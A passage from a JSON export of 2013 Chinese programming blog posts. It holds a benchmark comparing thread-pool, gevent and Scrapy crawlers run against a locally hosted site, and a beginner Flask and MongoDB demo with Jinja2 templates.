    "url": "/archives/gevent-twisted-duo-xian-cheng-shui-geng-kuai/",
    "content": "####*前言*\n\n标题有点唬人，以前了解过研究gevent，twisted，scrapy（基于twisted）。最近有个想法：这些东西比如做爬虫，谁的效率更好呢？\n我就写了以下程序（附件）测试然后用timeit（跑3次，每次10遍，时间有限）看效果\n\n\n####原理：\n\n1. 为了防止远程网络的问题，从一个网站爬下网页代码（html），页面下载本地放在了我的本机（gentoo+apache）\n2. 然后爬虫去分析这些页面上面的链接（开始是主页），再挖掘其他页面，抓取页面关键字（我这里就是个‘py’）\n程序打包[Crawler.tar.bz2](http://www.dongwm.com/Crawler.tar.bz2)\n\n先看代码树：\n\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\ndongwm@localhost ~ $ tree Crawler/\nCrawler/\n├── common_Crawler.py  #标准爬虫，里面只是多线程编程，抓取分析类在common.py\n├── common.py  #共用函数，里面只是抓取页面分析页面关键字\n├── common.pyc #你懂得\n├── Crawler #scrapy和django框架差不多的用法\n│   ├── __init__.py\n│   ├── __init__.pyc\n│   ├── items.py #不需要利用，默认\n│   ├── pipelines.py\n│   ├── settings.py\n│   ├── settings.pyc\n│   └── spiders #抓取脚本文件夹\n│       ├── __init__.py\n│       ├── __init__.pyc\n│       ├── spiders.py #我做的分析页面，这个和多线程/gevent调用的抓取分析类不同，我使用了内置方法（大家可以修改共用函数改成scrapy的方式，这样三种效果就更准确了）\n│       └── spiders.pyc\n├── gevent_Crawler.py #gevent版本爬虫，效果和标准版一样，抓取分析类也是common.py 保证其他环节相同，只是一个多线程，一个用协程\n├── scrapy.cfg\n└── scrapy_Crawler.py #因为scrapy使用是命令行，我用subproess封装了命令，然后使用timeit计算效果\n\n2 directories, 16 files\n</pre></figure></notextile></div>\n\n\n####实验前准备：\n停掉我本机使用的耗费资源的进程 firefox，vmware，compiz等，直到负载保持一个相对拨波动平衡\n\n\n####测试程序：\n\n1. common.py \n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n#!/usr/bin/python\n#coding=utf-8\n\n# Version 1 by Dongwm 2013/01/10\n# 脚本作用：多线程抓取\n# 方式： lxml + xpath + requests\n\nimport requests\nfrom  cStringIO import StringIO\nfrom lxml import etree\n\nclass Crawler(object):\n\n    def __init__(self, app):\n        self.deep = 2  #指定网页的抓取深度        \n        self.url = '' #指定网站地址\n        self.key = 'by' #搜索这个词\n        self.tp = app #连接池回调实例\n        self.visitedUrl = [] #抓取的网页放入列表,防止重复抓取\n\n    def _hasCrawler(self, url): \n        '''判断是否已经抓取过这个页面'''\n        return (True if url in self.visitedUrl else False)\n     \n    def getPageSource(self, url, key, deep): \n        ''' 抓取页面,分析,入库.\n        '''\n        if self._hasCrawler(url): #发现重复直接return\n            return \n        else:\n            self.visitedUrl.append(url) #发现新地址假如到这个列\n        r = requests.get('http://localhost/%s' % url)\n        encoding = r.encoding #判断页面的编码\n        result = r.text.encode('utf-8').decode(encoding)\n\t    #f = StringIO(r.text.encode('utf-8'))\n        try:  \n            self._xpath(url, result, ['a'], unicode(key, 'utf8'), deep) #分析页面中的连接地址,以及它的内容\n            self._xpath(url, result, ['title', 'p', 'li', 'div'], unicode(key, \"utf8\"), deep) #分析这几个标签的内容\n        except TypeError: #对编码类型异常处理,有些深度页面和主页的编码不同\n            self._xpath(url, result, ['a'], key, deep)\n            self._xpath(url, result, ['title', 'p', 'li', 'div'], key, deep)\n        return True\n\n    def _xpath(self, weburl, data, xpath, key, deep):\n        page = etree.HTML(data)\n        for i in xpath:\n            hrefs = page.xpath(u\"//%s\" % i) #根据xpath标签\n            if deep >1:\n                for href in hrefs:\n                    url = href.attrib.get('href','')\n                    if not url.startswith('java') and not url.startswith('#') and not \\\n                        url.startswith('mailto') and url.endswith('html'):  #过滤javascript和发送邮件的链接\n                            self.tp.add_job(self.getPageSource,url, key, deep-1) #递归调用,直到符合的深\n            for href in hrefs:\n                value = href.text  #抓取相应标签的内容\n                if value:\n                    m = re.compile(r'.*%s.*' % key).match(value) #根据key匹配相应内容\n\n    def work(self):\n        self.tp.add_job(self.getPageSource, self.url, self.key, self.deep)\n        self.tp.wait_for_complete() #等待线程池完成\n</pre></figure></notextile></div>\n\n\n2. common_Crawler.py\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n#!/usr/bin/python\n#coding=utf-8\n\n# Version 1 by Dongwm 2013/01/10\n# 脚本作用：多线程\n\n\n\nimport time\nimport threading\nimport Queue\nfrom common import Crawler\n\n#lock = threading.Lock()   #设置线程锁\n\n\nclass MyThread(threading.Thread):\n\n    def __init__(self, workQueue, timeout=1, **kwargs):\n        threading.Thread.__init__(self, kwargs=kwargs)\n        self.timeout = timeout #线程在结束前等待任务队列多长时间\n        self.setDaemon(True)  #设置deamon,表示主线程死掉,子线程不跟随死掉\n        self.workQueue = workQueue\n        self.start() #初始化直接启动线程\n\n    def run(self):\n        '''重载run方法'''\n        while True:\n            try:\n                #lock.acquire() #线程安全上锁 PS:queue 实现就是线程安全的，没有必要上锁 ,否者可以put/get_nowait\n                callable, args = self.workQueue.get(timeout=self.timeout) #从工作队列中获取一个任务\n                res = callable(*args)  #执行的任务\n                #lock.release()  #执行完,释放锁 \n            except Queue.Empty: #任务队列空的时候结束此线程\n                break\n            except Exception, e:\n                return -1\n\n\nclass ThreadPool(object):\n\n    def __init__(self, num_of_threads):\n         self.workQueue = Queue.Queue()\n         self.threads = []\n         self.__createThreadPool(num_of_threads)\n \n    def __createThreadPool(self, num_of_threads):\n        for i in range(num_of_threads):\n             thread = MyThread(self.workQueue)\n             self.threads.append(thread)\n\n    def wait_for_complete(self):\n        '''等待所有线程完成'''\n        while len(self.threads):\n            thread = self.threads.pop()\n            if thread.isAlive():  #判断线程是否还存活来决定是否调用join\n                thread.join()\n     \n    def add_job( self, callable, *args):\n        '''增加任务,放到队列里面'''\n        self.workQueue.put((callable, args))\ndef main():\n\n    tp = ThreadPool(10) \n    crawler = Crawler(tp)\n    crawler.work()\n\nif __name__ == '__main__':\n\n    import timeit\n    t = timeit.Timer(\"main()\") \n    t.repeat(3, 10)\n</pre></figure></notextile></div>\n\n3. gevent_Crawler.py\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n#!/usr/bin/python\n#coding=utf-8\n\n# Version 1 by Dongwm 2013/01/10\n# 脚本作用：gevent\n\nimport gevent.monkey\ngevent.monkey.patch_all()\nfrom gevent.queue import Empty, Queue\nimport gevent\nfrom common import Crawler\n\nclass GeventLine(object):\n\n    def __init__(self, workQueue, timeout=1, **kwargs):\n        self.timeout = timeout #线程在结束前等待任务队列多长时间\n        self.workQueue = workQueue\n\n    def run(self):\n        '''重载run方法'''\n        while True:\n            try:\n                callable, args = self.workQueue.get(timeout=self.timeout) #从工作队列中获取一个任务\n                res = callable(*args)  #执行的任务\n                print res\n            except Empty:\n                break\n            except Exception, e:\n            \tprint e\n                return -1\n\nclass GeventPool(object):\n\n\tdef __init__(self, num_of_threads):\n\t         self.workQueue = Queue()\n\t         self.threads = []\n\t         self.__createThreadPool(num_of_threads)\n\t \n\tdef __createThreadPool(self, num_of_threads):\n\t    for i in range(num_of_threads):\n\t         thread = GeventLine(self.workQueue)\n\t         self.threads.append(gevent.spawn(thread.run))\n\n\n\tdef wait_for_complete(self):\n\t    '''等待所有线程完成'''\n\n\t    while len(self.threads):\n\t        thread = self.threads.pop()\n\t        thread.join()\n\t    gevent.shutdown()\n\t \n\tdef add_job( self, callable, *args):\n\t    '''增加任务,放到队列里面'''\n\t    self.workQueue.put((callable, args))\n\ndef main():\n\ttp = GeventPool(10) \n\tcrawler = Crawler(tp)\n\tcrawler.work()\n\nif __name__ == '__main__':\n\n    import timeit\n    t = timeit.Timer(\"main()\") \n    t.repeat(3, 10)\n\n</pre></figure></notextile></div>\n\n4. Crawler/spiders/spiders.py\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nfrom scrapy.contrib.spiders import CrawlSpider, Rule\nfrom scrapy.selector import HtmlXPathSelector\nfrom scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor\nfrom scrapy.item import Item\n\nclass MySpider(CrawlSpider):\n    name = 'localhost'\n    allowed_domains = ['localhost']\n    start_urls = ['http://localhost']\n    rules = ( \n        Rule(SgmlLinkExtractor(allow=(r'http://localhost/.*')), callback=\"parse_item\"),  \n    )  \n    def parse_item(self, response):\n        hxs = HtmlXPathSelector(response)\n        hxs.select('//*[@*]/text()').re(r'py')  #实现了common.py里面的抓取和分析，但是common.py是抓取五种标签，分2次抓取，这里是抓取所有标签，不够严禁\n\n</pre></figure></notextile></div>\n\n5. scrapy_Crawler.py #时间有限，没有研究模块调用，也不够严禁\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n\n#!/usr/bin/python\n#coding=utf-8\n\n# Version 1 by Dongwm 2013/01/10\n# 脚本作用：scrapy\n\nfrom subprocess import call\n\ndef main():\n\tcall('scrapy crawl localhost --nolog', shell=True)\n\nif __name__ == '__main__':\n\n    import timeit\n    t = timeit.Timer(\"main()\") \n    t.repeat(3, 10)\n</pre></figure></notextile></div>\n\n####实验过程\n\n#####1. 同时启动三个终端，一起跑（手点回车，肯定有点延迟）\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\ndongwm@localhost ~/Crawler $ python scrapy_Crawler.py\n10000000 loops, best of 3: 0.024 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0223 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0223 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0223 usec per loop\n10000000 loops, best of 3: 0.0222 usec per loop\n10000000 loops, best of 3: 0.0223 usec per loop #他是最快跑完的，非常快～～  数据很稳定\n\ndongwm@localhost ~/Crawler $ python gevent_Crawler.py\n100000000 loops, best of 3: 0.0134 usec per loop\n100000000 loops, best of 3: 0.0131 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0134 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0133 usec per loop\n100000000 loops, best of 3: 0.0133 usec per loop\n100000000 loops, best of 3: 0.0133 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0133 usec per loop\n100000000 loops, best of 3: 0.0132 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0123 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0123 usec per loop  #跑得很慢，不知道是不是timeit的原因(或者调用的优先级太低，抢资源能力不行)，很奇怪，但是它的数据最快，数据稳定在0.0123-0.0133\n\n\ndongwm@localhost ~/Crawler $ python common_Crawler.py\n100000000 loops, best of 3: 0.0274 usec per loop\n10000000 loops, best of 3: 0.0245 usec per loop\n10000000 loops, best of 3: 0.0252 usec per loop\n10000000 loops, best of 3: 0.0239 usec per loop\n10000000 loops, best of 3: 0.025 usec per loop\n10000000 loops, best of 3: 0.0273 usec per loop\n10000000 loops, best of 3: 0.0255 usec per loop\n10000000 loops, best of 3: 0.0261 usec per loop\n10000000 loops, best of 3: 0.0275 usec per loop\n10000000 loops, best of 3: 0.0261 usec per loop\n10000000 loops, best of 3: 0.0257 usec per loop\n10000000 loops, best of 3: 0.0273 usec per loop\n10000000 loops, best of 3: 0.0241 usec per loop\n10000000 loops, best of 3: 0.0257 usec per loop\n10000000 loops, best of 3: 0.0275 usec per loop\n10000000 loops, best of 3: 0.0241 usec per loop\n10000000 loops, best of 3: 0.0259 usec per loop\n10000000 loops, best of 3: 0.0251 usec per loop\n10000000 loops, best of 3: 0.0193 usec per loop\n10000000 loops, best of 3: 0.0176 usec per loop\n100000000 loops, best of 3: 0.0199 usec per loop\n100000000 loops, best of 3: 0.0167 usec per loop\n100000000 loops, best of 3: 0.018 usec per loop\n10000000 loops, best of 3: 0.0179 usec per loop\n100000000 loops, best of 3: 0.0173 usec per loop\n100000000 loops, best of 3: 0.0172 usec per loop\n100000000 loops, best of 3: 0.018 usec per loop\n100000000 loops, best of 3: 0.0162 usec per loop\n100000000 loops, best of 3: 0.0179 usec per loop\n100000000 loops, best of 3: 0.0171 usec per loop  #第二跑得快，但是还是数据不稳定，时间在0.017-0.026之间\n</pre></figure></notextile></div>\n#####2. 挨个启动，待负载保持一个相对拨波动平衡 在换另一个\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\ndongwm@localhost ~/Crawler $ python scrapy_Crawler.py\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0122 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0123 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0123 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0122 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0123 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0122 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0122 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop   #数据很稳定，在0.0122-0.0126之间 机器负载在1.3左右,最高超过了1.4（闲暇0.6左右）\n</pre></figure></notextile></div>\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\ndongwm@localhost ~/Crawler $ python gevent_Crawler.py\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0126 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop\n100000000 loops, best of 3: 0.0125 usec per loop\n100000000 loops, best of 3: 0.0124 usec per loop  #数据很稳定，在0.0124-0.0126之间 机器负载在1.2左右（闲暇0.6左右）\n</pre></figure></notextile></div>\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\ndongwm@localhost ~/Crawler $ python common_Crawler.py\n10000000 loops, best of 3: 0.0135 usec per loop\n100000000 loops, best of 3: 0.0185 usec per loop\n10000000 loops, best of 3: 0.0174 usec per loop\n100000000 loops, best of 3: 0.019 usec per loop\n10000000 loops, best of 3: 0.016 usec per loop\n10000000 loops, best of 3: 0.0181 usec per loop\n10000000 loops, best of 3: 0.0146 usec per loop\n100000000 loops, best of 3: 0.0192 usec per loop\n10000000 loops, best of 3: 0.0165 usec per loop\n10000000 loops, best of 3: 0.0176 usec per loop\n10000000 loops, best of 3: 0.0177 usec per loop\n10000000 loops, best of 3: 0.0182 usec per loop\n100000000 loops, best of 3: 0.0195 usec per loop\n10000000 loops, best of 3: 0.0163 usec per loop\n10000000 loops, best of 3: 0.0161 usec per loop\n100000000 loops, best of 3: 0.0191 usec per loop\n100000000 loops, best of 3: 0.0193 usec per loop\n10000000 loops, best of 3: 0.0147 usec per loop\n100000000 loops, best of 3: 0.0197 usec per loop\n10000000 loops, best of 3: 0.0178 usec per loop\n10000000 loops, best of 3: 0.0172 usec per loop\n100000000 loops, best of 3: 0.022 usec per loop\n100000000 loops, best of 3: 0.0191 usec per loop\n10000000 loops, best of 3: 0.0208 usec per loop\n10000000 loops, best of 3: 0.0144 usec per loop\n10000000 loops, best of 3: 0.0201 usec per loop\n100000000 loops, best of 3: 0.0195 usec per loop\n100000000 loops, best of 3: 0.0231 usec per loop\n10000000 loops, best of 3: 0.0149 usec per loop\n100000000 loops, best of 3: 0.0211 usec per loop #数据有点不稳定，浮动较大，但是最要在0.016-0.019  机器负载曾经长时间在1.01,最高未超过1.1 （闲暇0.6左右）\n</pre></figure></notextile></div>\n\n\n####一些我的看法\n\n虽然我的实验有不够严禁的地方，我的代码能力也有限（希望有朋友看见代码能提供修改意见或更NB的版本），但是效果还是比较明显的，我总结下\n\n1. gevent确实性能很好，并且很稳定，占用io一般(据说长时间使用有内存泄露的问题？我不理解)\n2. scrapy这个框架把爬虫封装的很好，只需要最少的代码就能实现，性能也不差gevent\n3. 多线程编程确实有瓶颈，并且不稳定\n\n",
    "date": {
      "year": "2013",
      "month": "January",
      "day": "11"
    }
  },
  {
    "id": 256,
    "title": "一个flask例子",
    "category": "flask",
    "tags": [
      "flask",
      "jinja2",
      "python"
    ],
    "url": "/archives/1ge-flaskli-zi/",
    "content": "####前言：\n\n上段时间做了个demo, 使用了flask和mongodb，以及bootstrap, jquery，分享给大家当作入门flask的例子\n\n\n####启动程序代码\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n#!/usr/bin/env python2\n# encoding=utf-8\n# Version 2 by Dongwm 2012/12/18\n\nimport os\nfrom pymongo import Connection\n\nfrom flask import Flask, request, render_template, redirect, url_for, jsonify\nfrom paginate import Pagination\nimport setting\n\ndef static(filename):\n    filepath = os.path.join(os.path.dirname(__file__), 'static', filename)\n    last_modification = '%d' % os.path.getmtime(filepath)\n    return url_for('.static', filename=filename) + '?' + last_modification  #我这里给每个文件加了一个唯一性质的时间戳\n\ndef create_app():\n    app = Flask(__name__)\n    app.config.from_object(setting)  #把一些可以控制的参数放在setting模块里面\n    @app.context_processor\n    def inject_static():\n        return dict(static=static)\n    return app\n\ndef conMongo(): #因为我很多地方都需要mongodb的游标，封装了下\n\tmongo = Connection(host='127.0.0.1',port=28012)\n\treturn mongo\n\napp = create_app()\n\n@app.route('/list')  #flask使用装饰器的作为路由方式 表示访问你网站（比如http://localhost/list）的请求都会通过这个函数处理\ndef list(): #函数名字不重要，只要你能理解好维护，通过名字了解用途就好\n\tpagesize = 100  \n\tpage = int(request.args.get('page',0))\n\tdata = get_list_MongoData(page, pagesize) #这个获得mongodb的函数我就不提供了 简单理解就是更具页数和每页条目获取数据\n\tpagination = Pagination(total=data[1], per_page=pagesize, page=page)\n\treturn render_template(\"list.html\", tables=data[0], pagination=pagination) #有点像django的render_to_response,但是flask直接把要渲染的数据用K=V的方式传进来，而django需要放在字典里面，作为第二个参数传\n\n@app.route('/')  \ndef index():\n\treturn redirect(url_for('list')) #到网站跟目录的请求定向到/list\n\n@app.route('/json')  \ndef getJson():\n\n\tdb = conMongo()\n\tres = results(db)\n\treturn jsonify(res)  #类似django的HttpResponse(simplejson.dumps(res), mimetype='application/json') 返回json数据\n\n@app.route('/dev')\ndef dev():\n\t\n\treturn render_template(\"dev.html\")\n\nif __name__ == '__main__':\n\tapp.run(host=\"0.0.0.0\")\n\n</pre></figure></notextile></div>\n\n####settings.py\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nDEBUG = True  #指定开启debug模式\nPORT = 5000  #指定监听端口\n</pre></figure></notextile></div>\n\n####dev.html\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n\n\n<xmp>\n<!-- 注意这段代码我把 {/}和%分开了 为了和octoress生成的模板语法不冲突-->\n{ % extends 'base.html' % }  //这里是先继承base.html模板 \n{ % block title %}Dev{ % endblock % }  //重新设定title块的内容\n{ %- block css % }  //重新设定css块  注意引用静态文件的方式\n    <link rel=\"stylesheet\" href=\"{{ static(filename='css/devstyle.css') }}\" />\n    <style>\n\t.col_content{ height:500px; }\n\th2 {text-align:center;}\n\t</style>\n{ %- endblock % }\n{ %- block js % }\n    <script type=\"text/javascript\" src=\"{{ static(filename='js/amcharts.js') }}\"></script>\n    <script type=\"text/javascript\" src=\"{{ static(filename='js/raphael.js') }}\"></script>\n    <script language=\"javascript\" type=\"text/javascript\">\n\t\t</script>\n\t\t{ %- endblock % }\n\t\t{ %- block diejs % }\n\t\t\tpie2html();  //这个js函数在core.js定义（base.html有引用）\n\t\t{ %- endblock % }\n\t\t{ %- block dev % }\n\t<div>\n\t\t<h2>服务器服务信息</h2>\n\t\t<div class=\"well col_content\" id=\"webserver_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>服务器应用信息</h2>\n\t\t<div class=\"well col_content\" id=\"webapp_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>Nginx服务具体版本</h2>\n\t\t<div class=\"well col_content\" id=\"nginx_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>Apache服务具体版本</h2>\n\t\t<div class=\"well col_content\" id=\"apache_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>Asp服务具体版本</h2>\n\t\t<div class=\"well col_content\" id=\"asp_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>网站技术信息</h2>\n\t\t<div class=\"well col_content\" id=\"tech_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>系统分类</h2>\n\t\t<div class=\"well col_content\" id=\"system_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>系统分类</h2>\n\t\t<div class=\"well col_content\" id=\"version_content\">\n\t\tLoading......\n\t\t</div>\n\t\t<h2>os</h2>\n\t\t<div class=\"well col_content\" id=\"os_content\">\n\t\tLoading......\n\t\t</div>\n\t</div>\n{ %- endblock % }\n</xmp>\n\n</pre></figure></notextile></div>\n\n\t\n####base.html\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n\n<xmp>\n<!doctype html>\n<html>\n  <head>\n    <title> { % block title % }{ % endblock % }</title>  //block会设置的一个块，每个模板文件要是重新定义会覆盖，否则继承它的值\n    <link rel=\"stylesheet\" href=\"{{ static(filename='css/bootstrap.css') }}\" />\n    <link rel=\"stylesheet\" href=\"{{ static(filename='css/bootstrap-responsive.css') }}\" />  \n    <link rel=\"stylesheet\" href=\"{{ static(filename='css/style.css') }}\" />\n    { %- block css % }\n    { %- endblock % }\n    <script type=\"text/javascript\" src=\"{{ static(filename='js/jquery-1.8.0.min.js') }}\"></script>\n    <script type=\"text/javascript\" src=\"{{ static(filename='js/core.js') }}\"></script>\n    { %- block js % }\n    { %- endblock % }\n\t<script language=\"javascript\" type=\"text/javascript\">\n\t\t$(document).ready(function() {\n\t\tvar i = 0;\n\t\t$('#control').click(function() {\n\t\t\t\tif(i%2 == 0) {\n\t\t\t\t\t$('#zt-user').slideDown(500);  //加载完成的一个特效,都在style.css中定义\n\t\t\t\t\t$('#control').removeClass('bkg-control-down').addClass('control-up');\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t$('#zt-user').slideUp(500);\n\t\t\t\t\t$('#control').removeClass('bkg-control-up').addClass('control-down');\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t});\n\t\t{ %- block diejs % }  //这个块定义在这里是为了每个模板文件都能定义文档加载完成执行的函数，一个页面只能有一个$(document).ready\n\t\t{ %- endblock % }\n\t\t</script>\n</head>\n\t<body>\n\t\t<div id=\"zt-user\">\n\t\t\t<div class=\"container\">\n\t\t\t\t<div id=\"zt-user-inner\" class=\"row-fluid\">\n\t\t\t\t\t<div id=\"zt-top1\" class=\"span12\">\n\t\t\t\t\t\t<div class=\"zt-box-inside\">\n\t\t\t\t\t\t\t<div class=\"moduletable\">\n\t\t\t\t\t\t\t\t<div class=\"modulecontent\">\n\t\t\t\t\t\t<form action=\"/\" method=\"post\">\n\t\t\t\t\t\t\t<div class=\"search\">\n\t\t\t\t\t\t\t\t<input name=\"searchword\" maxlength=\"20\"  class=\"inputbox\" type=\"text\" size=\"20\" value=\"Start Searching ... \"  onblur=\"if (this.value=='') this.value='Start Searching ... ';\" onfocus=\"if (this.value=='Start Searching ... ') this.value='';\" /><input type=\"submit\" value=\"Search\" class=\"button\" onclick=\"this.form.searchword.focus();\"/>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</form>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t</div>\n\t\t{ %- block dev % }{ %- endblock % }   //上面的dev.html重新声明了这个块，那么数据就会显示在这个位置\n\t\t{ %- block top % }\n\t\t<div id=\"zt-top\">\n\t\t\t<div class=\"container\">\t\t\t\t\t\t\n\t\t\t\t<div class=\"row-fluid\">\n\t\t\t\t\t<div class=\"control-up span6\" id=\"control\"><span>Search</span></div>\n\t\t\t\t<ul id=\"zt-topright\" class=\"pull-right\">\n\t\t\t\t<li class=\"blue\" target=\"_blank\"><a title=\"Demo\" href=\"/list\">列表</a></li>\n\t\t\t\t<li class=\"green\" target=\"_blank\"><a title=\"Demo\" href=\"/dev\">画图</a></li>\n\t\t\t\t</ul>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t{ %- endblock % }\n\t\t{ %- block ttable % }{ %- endblock % }\n\t\t{ %- block footer % }\n\t\t<div id=\"zt-footer\">\n\t\t\t<div class=\"container\">\t\t\t\t\n\t\t\t\t<p id=\"copyright\">\n\t\t\t\tCopyright &copy; 2009 - 2013 <a href=\"http://www.dongwm.com\" title=\"dongwm\">(C)dongwm</a>. All Rights Reserved\n\t\t\t\t</p>\n\t\t\t</div>\t\t\t\t\t\t\n\t\t</div>\n\t\t{ %- endblock % }\n\t</body>\n</html>\n</xmp>\n\n</pre></figure></notextile></div>\n\n",
    "date": {
      "year": "2013",
      "month": "January",
      "day": "11"
    }
  },
  {
    "id": 257,
    "title": "gentoo使用wpa_supplicant配置无线网卡",
    "category": "gentoo",
    "tags": [
      "gentoo",
      "wpa_supplicant",
      "wireless"
    ],
    "url": "/archives/gentoo-wpa_supplicant-wireless/",
